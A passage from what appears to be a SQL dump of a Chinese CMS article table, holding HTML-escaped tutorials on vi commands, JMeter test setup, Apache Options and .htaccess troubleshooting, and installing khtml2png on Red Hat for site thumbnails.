&lt;b&gt;在命令模式下按 shift+: 文本底端出现冒号&lt;/b&gt;　　:w 保存；　　:w filename 另存为filename；　　:wq! 保存退出；　　:wq! filename 注：以filename为文件名保存后退出；　　:q! 不保存退出；　　:x 应该是保存并退出 ，功能和:wq!相同　　&lt;b&gt;撤销操作&lt;/b&gt;　　u命令取消最近一次的操作，可以使用多次来恢复原有的操作&lt;sup&gt;[1]&lt;/sup&gt;&lt;a name=&quot;ref_[1]&quot;&gt;&lt;/a&gt;　　U取消所有操作　　Ctrl+R可以恢复对使用u命令的操作　　&lt;b&gt;复制操作&lt;/b&gt;　　yy命令复制当前整行的内容到vi&lt;a target=&quot;_blank&quot; href=&quot;http://baike.baidu.com/view/266782.htm&quot;&gt;缓冲区&lt;/a&gt;　　yw复制当前光标所在位置到单词尾字符的内容到vi缓存区，相当于复制一个单词　　y$复制光标所在位置到行尾内容到缓存区　　y^复制光标所在位置到行首内容到缓存区　　#yy例如：5yy就是复制5行　　#yw例如：2yw就是复制两个单词　　如果要复制第m行到第n行之间的内容，可以在末行模式中输入m，ny例如：3，5y复制第三行到第五行内容到缓存区。　　&lt;b&gt;查找和替换&lt;/b&gt;　　vi的查找和替换功能主要在末行模式完成：　　至上而下的查找　　/ 要查找的字符窜，其中/代表从光标所在位置起开始查找，例如：/ work　　至下而上的查找　　？要查找的字符窜 例如：/ work　　替换　　:s/old/new用new替换行中首次出现的old　　: s/old/new/g 用new替换行中所有出现的old　　:#,# s/old/new/g用new替换从第＃行到第＃行中出现的old　　:% s/old/new/g用new替换整篇中出现的old　　如果替换的范围较大时，在所有的命令尾加一个c命令，强制每个替换需要用户进行确认，例如:s/old/new/c 或s/old/new/gc　　&lt;b&gt;恢复文件　　&lt;/b&gt;　vi在编辑某一个文件时，会生成一个&lt;a target=&quot;_blank&quot; href=&quot;http://baike.baidu.com/view/898304.htm&quot;&gt;临时文件&lt;/a&gt;，这个文件以 . 开头并以 .swp结尾。正常退出该文件自动删除，如果意外退出例如忽然断电，该文件不会删除，我们在下次编辑时可以选择一下命令处理：　　O只读打开，不改变文件内容　　E继续编辑文件，不恢复.swp文件保存的内容　　R将恢复上次编辑以后未保存文件内容　　Q退出vi　　D删除.swp文件　　或者使用vi －r 文件名来恢复未保存的内容', 1, 1, 0, 0, 1305713673, 1, 'admin'),
(121, 1, '如何建立和使用Jmeter测试环境', '', '', '&lt;p style=&quot;text-indent:2em;&quot;&gt;如何建立和使用Jmeter测试环境（初学者） 收藏&lt;br /&gt;\r\n一、 工具描述&lt;br /&gt;\r\napachejmeter是100％的java桌面应用程序，它被设计用来加载被测试软件功能特性、度量被测试软件的性能。设计jmeter的初衷是测试web应用，后来又扩充了其它的功能。jmeter可以完成针对静态资源和动态资源（servlets,perl脚本, java对象, 数据查询s, ftp服务等）的性能测试。jmeter可以模拟大量的服务器负载、网络负载、软件对象负载，通过不同的加载类型全面测试软件的性能。并且jmeter提供图形化的性能分析。&lt;br /&gt;\r\n二、 使用环境&lt;br /&gt;\r\nJMeter可以运行在solaris, linux, windows (98, nt, 2000，2003).jdk1.4以上。本文章主要介绍使用JMeter测试windows环境的web server 和DBserver的环境搭建步骤，以及使用Jmeter进行压力测试的入门。&lt;br /&gt;\r\n三、 软件下载&lt;br /&gt;\r\nJDK1.5&amp;nbsp;&lt;wbr&gt; &lt;a href=&quot;http://java.sun.com/javase/downloads/index.jsp&quot;&gt;http://java.sun.com/javase/downloads/index.jsp&lt;/a&gt;&lt;br /&gt;\r\nApache tomcat 5.5&amp;nbsp;&lt;wbr&gt;&amp;nbsp;&lt;wbr&gt; &lt;a href=&quot;http://tomcat.apache.org/download-55.cgi&quot;&gt;http://tomcat.apache.org/download-55.cgi&lt;/a&gt;&lt;br /&gt;\r\njakarta-jmeter-2.2&amp;nbsp;&lt;wbr&gt; &lt;a href=&quot;http://jakarta.apache.org/site/downloads/downloads_jmeter.cgi&quot;&gt;http://jakarta.apache.org/site/downloads/downloads_jmeter.cgi&lt;/a&gt;&lt;br /&gt;\r\nsqljdbc_1.1.1501.101_enu.exe &lt;a href=&quot;http://www.microsoft.com/downloads/details.aspx?FamilyId=6D483869-816A-44CB-9787-A866235EFC7C&amp;amp;displaylang=en&quot;&gt;http://www.microsoft.com/downloads/details.aspx?FamilyId=6D483869-816A-44CB-9787-A866235EFC7C&amp;amp;displaylang=en&lt;/a&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;四、 JDK安装&lt;br /&gt;\r\n下载jdk-1_5_0_09-nb-5_0-win-ml.exe，这接点击默认安装，一般安装至C:\\ProgramFiles\\Java目录下。&lt;br /&gt;\r\n桌面上选择“我的电脑”(右键),高级, 环境变量, 在“系统变量”---&amp;gt;“新建”,在变量名中输入：CLASSPATH，变量值中输入：C:\\ProgramFiles\\Java\\jdk1.5.0_09\\lib\\dt.JAR; C:\\ProgramFiles\\Java\\jdk1.5.0_09\\lib\\TOOLS.JAR; C:\\ProgramFiles\\Java\\jdk1.5.0_09\\BIN;再按“新建”，在变量名中输入：JAVA_HOME，变量中输入：C:\\ProgramFiles\\Java\\jdk1.5.0_09；修改PATH变量，添加%JAVA_HOME%/bin；然后确定即可；&lt;br /&gt;\r\n五、 Apache tomcat安装&lt;br /&gt;\r\n下载apache-tomcat-5.5.20.exe直接点击按照默认路径安装，一般安装在C:\\Program Files\\ApacheSoftware Foundation\\Tomcat 5.5路径下即可。&lt;br /&gt;\r\n六、 Jmeter安装&lt;br /&gt;\r\n解压jakarta-jmeter-2.2.zip文件至c盘，本文解压至C:\\jakarta-jmeter-2.2目录下。&lt;br /&gt;\r\n桌面上选择“我的电脑”(右键),高级, 环境变量, 在“系统变量”---&amp;gt;“新建”,在变量名中输入：JMETER_HOME，变量值中输入：C:\\jakarta-jmeter-2.2，再修改CLASSPATH变量，变量值中添加%JMETER_HOME%\\lib\\ext\\ApacheJMeter_core.jar;%JMETER_HOME%\\lib\\jorphan.jar;%JMETER_HOME%\\lib\\logkit-1.2.jar;然后确定即可。&lt;br /&gt;\r\n七、 安装SQLJDBC驱动&lt;br /&gt;\r\n因为需要测试ms sql2005，所以需要安装SQLJDBC驱动，可以直接下载sqljdbc_1.1.1501.101_enu.exe，点击可以直接解压到C:\\ProgramFiles目录下，然后修改添加CLASSPATH =C:\\Program Files\\Microsoft SQL Server2005 JDBC Driver\\sqljdbc_1.0\\enu\\sqljdbc.jar，然后确定即可。&lt;br /&gt;\r\n一般还需要将目录下的C:\\Program Files\\Microsoft SQL Server 2005 JDBCDriver\\sqljdbc_1.1\\enu\\auth\\x86\\sqljdbc_auth.dll拷贝到C:\\WINDOWS\\system32，否则会提示找不到sqljdbc_auth.dll。&lt;br /&gt;\r\n另使用JDBC连接MS SQL2005数据库，需要在数据库安装后设置ICP/IP协议启动，具体如下：&amp;nbsp;&lt;wbr&gt;&amp;nbsp;&lt;wbr&gt;&lt;br /&gt;\r\n（1）打开SQL Server Configuration Manager；&lt;br /&gt;\r\n（2）转到SQL Server 2005 NetworkConfiguration-&amp;gt;Protocols for SQLEXPRESS；&lt;br /&gt;\r\n（3）将TCP/IP设置为Enabled（启用）；&lt;br /&gt;\r\n（4）双击TCP/IP项，转到IP Addresses页&lt;br /&gt;\r\n（5）IP All中设置TCP Port为1433；&lt;br /&gt;\r\n（6）重新启动服务；&lt;br /&gt;\r\n如何正确使用 JDBC 驱动程序，可以参见： &lt;a href=&quot;http://msdn2.microsoft.com/zh-cn/library/ms378526.aspx&quot;&gt;http://msdn2.microsoft.com/zh-cn/library/ms378526.aspx&lt;/a&gt;&lt;br /&gt;\r\n至此，Jmeter测试环境基本安装完成，该环境可以测试web server和DB server（MS SQL2005）。&lt;br /&gt;\r\n八、 分布式Web server压力测试设置&lt;br /&gt;\r\n作为一个纯 java 的gui应用，jmeter对于cpu和内存的消耗还是很惊人的，所以当需要模拟数以千计的并发用户时，使用单台机器模拟所有的并发用户就有些力不从心，甚至还会引起java内存溢出的错误。不过，jmeter也可以像 loadrunner 一样通过使用多台机器运行所谓的 agent 来分担 load generator自身的压力，并借此来获取更大的并发用户数。根据 jmeter官方文档的署名，你需要自己完成这个配置，不过不用担心，这将非常简单^_^&lt;br /&gt;\r\n1.在所有期望运行 jmeter 作为 load generator 的机器上安装 jmeter，并确定其中一台机器作为controller，其他的机器作为 agent。然后运行所有 agent机器上的jmeter-server.bat文件——假定我们使用两台机器 192.168.0.1 和 192.168.0.2 作为agent；&lt;br /&gt;\r\n2.在controller 机器的 jmeter 安装目录下找到 bin 目录，再找到 jmeter.properties这个文件，使用记事本或者其他文字编辑工具打开它；&lt;br /&gt;\r\n&amp;nbsp;&lt;wbr&gt;&amp;nbsp;&lt;wbr&gt;&amp;nbsp;&lt;wbr&gt;3.在打开的文件中查找“remote_hosts=”这个字符串，你可以找到这样一行“remote_hosts=127.0.0.1”。其中的127.0..0.1 表示运行 jmeter agent的机器，这里需要修改为“remote_hosts=192.168.0.1:1099,192.168.0.2:1099”——其中的1099为 jmeter 的 controller 和 agent 之间进行通讯的默认 rmi 端口号；&lt;br /&gt;\r\n4.保存文件，并重新启动 controller 机器上的 jmeter.bat，并进入 run -&amp;gt;remote start 菜单项。&lt;br /&gt;\r\n在具体实施过程中，需要注意设置好PATH系统环境变量，否则会出现提示找不到rmiregistry.exe，这是RMI注册程序，在JDK的bin目录下。还要注意保证1099端口没有被禁用。&lt;br /&gt;\r\n可以参见：&lt;a href=&quot;http://www.informit.com/guides/content.asp?g=java&amp;amp;seqNum=274&amp;amp;rl=1&quot;&gt;http://www.informit.com/guides/content.asp?g=java&amp;amp;seqNum=274&amp;amp;rl=1&lt;/a&gt;&lt;br /&gt;\r\n九、 JDBC Connection Configuration&lt;br /&gt;\r\n在测试DB server性能的时候，正确设置数据库URL和JDBC驱动类，一般如下设置：&lt;br /&gt;\r\nDatabase URL ：jdbc:sqlserver://192.166.6.37:1433;databaseName=jia_online;&lt;br /&gt;\r\nJDBC Drive class：com.microsoft.sqlserver.jdbc.SQLServerDriver&lt;br /&gt;\r\nUsername和password是打开数据库的用户名和密码。&lt;br /&gt;\r\n注意：请正确安装SQLJDBC驱动。&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;&amp;nbsp;&lt;wbr&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;本文来自CSDN博客，转载请标明出处：&lt;a href=&quot;http://blog.csdn.net/coolwasp/archive/2006/11/22/1404134.aspx&quot;&gt;http://blog.csdn.net/coolwasp/archive/2006/11/22/1404134.aspx&lt;/a&gt;&lt;/p&gt;\r\n', 1, 1, 0, 0, 1305771157, 1, 'admin'),
(122, 1, 'Apache之Options', '', '', '&lt;p style=&quot;text-indent:2em;&quot;&gt;Options&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;指令控制了在特定目录中将使用哪些服务器特性。&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;可选项能设置为&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;None&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;，在这种情况下，将不启用任何额外特性。或设置为以下选项中的一个或多个：&lt;/p&gt;\r\n&lt;dl&gt;&lt;dt&gt;All &lt;/dt&gt;&lt;dd&gt;除MultiViews之外的所有特性。这是默认设置。 &lt;/dd&gt;&lt;dt&gt;ExecCGI &lt;/dt&gt;&lt;dd&gt;允许执行CGI脚本. &lt;/dd&gt;&lt;dt&gt;FollowSymLinks &lt;/dt&gt;&lt;dd&gt;服务器会在此目录中使用符号连接。&lt;p style=&quot;text-indent:2em;&quot;&gt;注意：即便服务器会使用符号连接，但它不会改变用于匹配&amp;lt;Directory&amp;gt;配置段的路径名。&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;注意：如果此配置位于&amp;lt;Location&amp;gt;配置段中，则此设置会被忽略。 &lt;/p&gt;\r\n&lt;/dd&gt;&lt;dt&gt;Includes &lt;/dt&gt;&lt;dd&gt;允许服务器端包含。 &lt;/dd&gt;&lt;dt&gt;IncludesNOEXEC &lt;/dt&gt;&lt;dd&gt;允许服务器端包含，但禁用#exec命令和#exec CGI。但仍可以从ScriptAliase目录使用#include 虚拟CGI脚本。 &lt;/dd&gt;&lt;dt&gt;Indexes &lt;/dt&gt;&lt;dd&gt;如果一个映射到目录的URL被请求，而此目录中又没有DirectoryIndex（例如：index.html），那么服务器会返回一个格式化后的目录列表。 &lt;/dd&gt;&lt;dt&gt;MultiViews &lt;/dt&gt;&lt;dd&gt;允许内容协商的多重视图。 &lt;/dd&gt;&lt;dt&gt;SymLinksIfOwnerMatch &lt;/dt&gt;&lt;dd&gt;服务器仅在符号连接与其目的目录或文件拥有者具有同样的用户id时才使用它。&lt;p style=&quot;text-indent:2em;&quot;&gt;注意：如果此配置出现在&amp;lt;Location&amp;gt;配置段中，此选项将被忽略。 &lt;/p&gt;\r\n&lt;/dd&gt;&lt;/dl&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;一般来说，如果一个目录被多次设置了&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;Options&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;，则最特殊的一个会被完全接受，而各个可选项的设定彼此并不融合。然而，如果所有施用于&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;Options&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;指令的可选项前都加有+或-符号，此可选项将被合并。所有前面加有+号的可选项将强制覆盖当前可选项设置，而所有前面有-号的可选项将强制从当前可选项设置中去除。&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;比如说，没有任何+和-符号：&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;&amp;lt;Directory /web/docs&amp;gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;Options Indexes FollowSymLinks&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;&amp;lt;/Directory&amp;gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;&amp;lt;Directory /web/docs/spec&amp;gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;Options Includes&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;&amp;lt;/Directory&amp;gt; &lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;则只有&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;Includes&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;设置到/web/docs/spec目录上。然而如果第二个&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;Options&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;指令使用了+和-符号：&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;&amp;lt;Directory /web/docs&amp;gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;Options Indexes FollowSymLinks&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;&amp;lt;/Directory&amp;gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;&amp;lt;Directory /web/docs/spec&amp;gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;Options +Includes -Indexes&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;&amp;lt;/Directory&amp;gt; &lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;那么就会有&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;FollowSymLinks&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;和&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;Includes&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;设置到/web/docs/spec目录上。&lt;/p&gt;\r\n', 1, 1, 0, 0, 1305774539, 1, 'admin'),
(123, 1, 'apache下htaccess不起作用,linux,windows详解', '', '', '&lt;p&gt;可能出现下面这三种的错误可能性：&amp;nbsp;&lt;/p&gt;\r\n&lt;p&gt;&lt;strong&gt;第一种：启用 rewrite 和 .htaccess 设置&lt;/strong&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;strong&gt;rewrite设置&lt;/strong&gt;：找到apache的配置文件httpd.conf文件，找到：#LoadModule rewrite_module modules/mod_rewrite.so去掉前面的#号。&lt;/p&gt;\r\n&lt;p&gt;改为：LoadModule rewrite_module modules/mod_rewrite.so&lt;/p&gt;\r\n&lt;p&gt;&lt;strong&gt;.htaccess设置&lt;/strong&gt;：&lt;/p&gt;\r\n&lt;p&gt;windows里面这样设置：AccessFileName htaccess&amp;nbsp;&amp;nbsp; &lt;/p&gt;\r\n&lt;p&gt;linux里面这样设置：AccessFileName .htaccess。 &lt;/p&gt;\r\n&lt;p&gt;linux比windows里面文件名前面多了一个点。&lt;span style=&quot;color:#ff0000;&quot;&gt;如果没找到AccessFileName自己在httpd.conf文件最后面加上。&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&lt;/p&gt;\r\n&lt;p&gt;&lt;strong&gt;第二种：AllowOverride 的设置。&lt;/strong&gt;&lt;/p&gt;\r\n&lt;p&gt;默认AllowOverride 为AllowOverride none。把这个改为：AllowOverride All。如果配置了多个虚拟目录需在每个目录里面开启，实例：&lt;/p&gt;\r\n&lt;p&gt;&amp;lt;VirtualHost *:80&amp;gt;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; DocumentRoot &quot;D:\\SvnTrac\\svn\\SVNRepository\\wwwroot&quot;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ServerName 127.0.0.1:80&lt;br /&gt;\r\n&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; DirectoryIndex index.html index.htm index.php index.shtml&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;Directory &quot;D:\\SvnTrac\\svn\\SVNRepository\\wwwroot&quot;&amp;gt;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; Options Indexes FollowSymLinks&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;span style=&quot;color:#ff0000;&quot;&gt;AllowOverride ALL&lt;/span&gt;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; Order allow,deny&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; Allow from all&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;/Directory&amp;gt;&lt;br /&gt;\r\n&amp;lt;/VirtualHost&amp;gt;&lt;/p&gt;\r\n&lt;p&gt;&amp;lt;VirtualHost 127.0.0.2:80&amp;gt;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; DocumentRoot &quot;D:/SvnTrac/svn/SVNRepository/www/&quot;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ServerName 127.0.0.2:80&lt;br /&gt;\r\n&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; DirectoryIndex index.html index.htm index.php index.shtml&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;Directory &quot;D:/SvnTrac/svn/SVNRepository/www/&quot;&amp;gt;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; Options Indexes FollowSymLinks&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;span style=&quot;color:#ff0000;&quot;&gt;AllowOverride ALL&lt;/span&gt;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; Order allow,deny&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; Allow from all&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;/Directory&amp;gt;&lt;br /&gt;\r\n&amp;lt;/VirtualHost&amp;gt;&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&lt;/p&gt;\r\n&lt;p&gt;&lt;strong&gt;第三种：Options 的设置&lt;/strong&gt;&lt;/p&gt;\r\n&lt;p&gt;默认设置是：Options Indexes FollowSymLinks&lt;br /&gt;\r\n如果改成以下设置后，就会出错&lt;br /&gt;\r\nOptions Indexes FollowSymLinks MultiViews Includes （出错）&lt;br /&gt;\r\n如果要启用,目录浏览 MultiViews&lt;br /&gt;\r\n服务器端包含 Includes （&amp;lt;!–#include virtual=”top.htm” –&amp;gt;）&lt;/p&gt;\r\n&lt;p&gt;为了简单可以设置为：Options All&lt;br /&gt;\r\n&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;前两种是配置中常见的错误，第三种一般少见，最后提醒大家一下，记得配置文件改好后一定要重启服务器啊。有问题，留言，或收听微薄。&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&lt;/p&gt;\r\n', 1, 1, 0, 0, 1306291172, 1, 'admin');
INSERT INTO `cp_article` (`id`, `cat_id`, `title`, `keywords`, `description`, `content`, `views`, `status`, `top`, `recommend`, `create_time`, `create_uid`, `create_username`) VALUES
(124, 1, 'linux下生成网页缩略图', '', '', '近来在做一个directory，搜集一些个人常用的站点。每个站点都需要一份截图。折腾了一番，选用了khtml2png。khtml2png从2.6.0开始需要Qt library的支持，以下是详细的Requirements:&lt;br /&gt;\r\n&lt;blockquote&gt;Requirements For running and compiling you need some libraries and tools. You can find the Debian package names in braces&lt;br /&gt;\r\n* g++&lt;br /&gt;\r\n* &lt;span class=&quot;caps&quot;&gt;KDE&lt;/span&gt; 3.x&lt;br /&gt;\r\n* kdelibs for &lt;span class=&quot;caps&quot;&gt;KDE&lt;/span&gt; 3.x (kdelibs4-dev)&lt;br /&gt;\r\n* zlib (zlib1g-dev)&lt;br /&gt;\r\n* cmake&lt;/blockquote&gt;\r\n服务器系统是redhat &lt;span class=&quot;caps&quot;&gt;EL4,&lt;/span&gt;g++和zlib都是装过的了，尚缺kde&amp;amp;cmake。那就先装罢。&lt;h3&gt;用apt-get安装KDE for redhat&lt;/h3&gt;\r\n&lt;p&gt;添加几个kde的源，先创建一个新的list&lt;/p&gt;\r\n&lt;div class=&quot;code bash&quot;&gt;vi /etc/apt/sources.list.d/kde.list&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;br /&gt;\r\n添加如下地址&lt;br /&gt;\r\n&lt;div class=&quot;code bash&quot;&gt;rpm http://apt.kde-redhat.org/apt/kde-redhat redhat/el4/i386 stable&lt;br /&gt;\r\nrpm http://apt.kde-redhat.org/apt/kde-redhat all stable&lt;br /&gt;\r\n&lt;/div&gt;\r\n保存之后,先update一下，然后安装qt,arts,kdelibs,和kdebase&lt;br /&gt;\r\n&lt;div class=&quot;code bash&quot;&gt;apt-get update&lt;br /&gt;\r\napt-get install qt arts kdelibs kdebase&lt;br /&gt;\r\napt-get dist-upgrade&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;h3&gt;安装kdelibs for &lt;span class=&quot;caps&quot;&gt;&lt;span class=&quot;caps&quot;&gt;KDE &lt;/span&gt;&lt;/span&gt;（kdelibs4-dev）&lt;/h3&gt;\r\n&lt;p&gt;kdelibs4-dev这个包是debian用的，redhat适用的是kdelibs-devel。直接用apt-get安装即可。zlib(zlib1g-dev)也一样，redhat适用的是zlib-devel&lt;/p&gt;\r\n&lt;h3&gt;安装cmake&lt;/h3&gt;\r\n&lt;div class=&quot;code bash&quot;&gt;wget http://www.cmake.org/files/v2&lt;span style=&quot;color:#cc66cc;&quot;&gt;.4&lt;/span&gt;/cmake&lt;span style=&quot;color:#cc66cc;&quot;&gt;-2.4&lt;/span&gt;&lt;span style=&quot;color:#cc66cc;&quot;&gt;.7&lt;/span&gt;.tar.gz&lt;br /&gt;\r\ntar zxvf cmake&lt;span style=&quot;color:#cc66cc;&quot;&gt;-2.4&lt;/span&gt;&lt;span style=&quot;color:#cc66cc;&quot;&gt;.7&lt;/span&gt;.tar.gz&lt;br /&gt;\r\n&lt;span style=&quot;color:#000066;&quot;&gt;cd&lt;/span&gt; cmake&lt;span style=&quot;color:#cc66cc;&quot;&gt;-2.4&lt;/span&gt;&lt;span style=&quot;color:#cc66cc;&quot;&gt;.7&lt;/span&gt;&lt;br /&gt;\r\n./bootstrap&lt;br /&gt;\r\nmake&lt;br /&gt;\r\nmake install&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;br /&gt;\r\ncmake的安装需在安装qt之后进行，否则会找不到qt_include_path。&lt;p&gt;&lt;/p&gt;\r\n&lt;h3&gt;安装khtml2png&lt;/h3&gt;\r\n&lt;div class=&quot;code bash&quot;&gt;wget http://nchc.dl.sourceforge.net/sourceforge/khtml2png/khtml2png&lt;span style=&quot;color:#cc66cc;&quot;&gt;-2.6&lt;/span&gt;.7a.tar.gz&lt;br /&gt;\r\ntar zxvf khtml2png&lt;span style=&quot;color:#cc66cc;&quot;&gt;-2.6&lt;/span&gt;.7a.tar.gz&lt;br /&gt;\r\n&lt;span style=&quot;color:#000066;&quot;&gt;cd&lt;/span&gt; khtml2png&lt;span style=&quot;color:#cc66cc;&quot;&gt;-2.6&lt;/span&gt;.7a&lt;br /&gt;\r\n./configure&lt;br /&gt;\r\nmake&lt;br /&gt;\r\nmake install&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;br /&gt;\r\n&lt;p&gt;即可。&lt;/p&gt;\r\n&lt;h3&gt;用法&lt;/h3&gt;\r\n&lt;div class=&quot;code bash&quot;&gt;khtml2png2 http://&lt;span style=&quot;color:#cc66cc;&quot;&gt;163&lt;/span&gt;.com 163_com.png&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;br /&gt;\r\n指定图片尺寸&lt;br /&gt;\r\n&lt;div class=&quot;code bash&quot;&gt;khtml2png2 --height &lt;span style=&quot;color:#cc66cc;&quot;&gt;1024&lt;/span&gt; --width &lt;span style=&quot;color:#cc66cc;&quot;&gt;768&lt;/span&gt; http://&lt;span style=&quot;color:#cc66cc;&quot;&gt;163&lt;/span&gt;.com 163_com.png&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;br /&gt;\r\n执行上述指令后，桌面会打开一个浏览器窗口，载入目标页面，截图完成后自行关闭。在没有X或者是ssh连接服务器的情况下，需要再做点别的事情。 启动xfs daemon和X Server&lt;br /&gt;\r\n&lt;div class=&quot;code bash&quot;&gt;/etc/init.d/xfs start&lt;br /&gt;\r\n/usr/X11R6/bin/X :&lt;span style=&quot;color:#cc66cc;&quot;&gt;1&lt;/span&gt; &amp;amp;amp;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;br /&gt;\r\n之后在khtml2png2的指令上加一条&lt;div class=&quot;code bash&quot;&gt;--display :&lt;span style=&quot;color:#cc66cc;&quot;&gt;1&lt;/span&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n即可&lt;h3&gt;批量截图&lt;/h3&gt;\r\n&lt;p&gt;因为安全级的关系，没有使用PEF让php直接执行指令自动截图。转而加入了手动的因素。 即由php取得需要生成截图的网址列表，再生成一个批处理文件。然后由管理员手动执行。 &lt;span class=&quot;caps&quot;&gt;PHP&lt;/span&gt;生成的批处理文件siteslist&lt;/p&gt;\r\n&lt;div class=&quot;code bash&quot;&gt;&lt;span style=&quot;font-style:italic;color:#808080;&quot;&gt;#!/bin/sh&lt;/span&gt;&lt;br /&gt;\r\nkhtml2png2 --display :&lt;span style=&quot;color:#cc66cc;&quot;&gt;1&lt;/span&gt; http://www&lt;span style=&quot;color:#cc66cc;&quot;&gt;.163&lt;/span&gt;.com 163_com.png&lt;br /&gt;\r\nkhtml2png2 